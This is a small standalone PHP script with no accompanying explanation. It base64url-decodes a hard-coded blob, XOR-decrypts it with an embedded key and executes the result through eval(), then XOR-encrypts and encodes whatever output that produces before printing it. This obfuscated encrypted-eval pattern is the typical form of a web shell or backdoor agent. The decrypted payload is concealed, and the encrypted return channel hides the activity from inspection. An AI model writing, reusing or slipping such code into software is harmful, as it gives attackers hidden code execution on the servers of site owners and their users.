<?php

function base64url_encode($data)
{
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
function base64url_decode($data)
{
    return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}
function x($k, $p)
{
    $c = "";
    $l = strlen($k);
    $pl = strlen($p);
    for ($i = 0; $i < $pl; $i++) {
        $c .= $k[$i % $l] ^ $p[$i];
    }
    return $c;
}
$k = '9bb3622bac8541b6';
$content = 'czNwM2hyCg%3D%3D=eQEKV19AGkBOFVlHG0YVQRYBDV1QW1VASFh4Rk1CFlNUSkBQV0YSAQ4NXlxTHwtYWkwSW0YQG1khEEFGQFQPHhsBA0cWUUcRFQxVUEZCPVJbTBJbRhAbWQ';
$split = array(0 => "czNwM2hyCg%3D%3D", 1 => "eQEKV19AGkBOFVlHG0YVQRYBDV1QW1VASFh4Rk1CFlNUSkBQV0YSAQ4NXlxTHwtYWkwSW0YQG1khEEFGQFQPHhsBA0cWUUcRFQxVUEZCPVJbTBJbRhAbWQ");
if (strcmp(base64url_decode($split[0]), 's3p3hr')) {
    $decoded = base64url_decode($split[1]);
    $decrypted = x($k, $decoded);
    ob_start();
    try {
        eval($decrypted);
    } catch (exception $e) {
        print $e->getMessage();
    }
    $o = ob_get_contents();
    $c = x($k, $o);
    $e = base64url_encode($c);
    ob_end_clean();
    print $e . "\n";
}
